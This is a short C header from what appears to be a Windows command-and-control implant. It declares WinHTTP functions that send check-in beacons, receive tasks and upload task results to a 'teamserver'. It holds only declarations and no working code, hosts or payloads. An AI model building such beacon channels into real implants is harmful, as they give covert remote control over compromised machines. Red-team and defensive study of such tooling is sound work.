#ifndef DN_HTTPS_H
#define DN_HTTPS_H

#include <windows.h>
#include "../util/types.h"

/*
 * HTTPS communication channel using WinHTTP
 * Handles check-in beacons and task result uploads
 */

// Initialize HTTPS comms (create WinHTTP session)
BOOL dn_https_init(void);

// Send check-in beacon, receive tasks
// Returns TRUE on success, fills response struct
BOOL dn_https_checkin(DN_METADATA* meta, DN_CHECKIN_RESPONSE* response);

// Send task results back to teamserver
BOOL dn_https_send_results(DN_TASK_RESULT* results, int count);

// Cleanup WinHTTP handles
void dn_https_cleanup(void);

#endif // DN_HTTPS_H
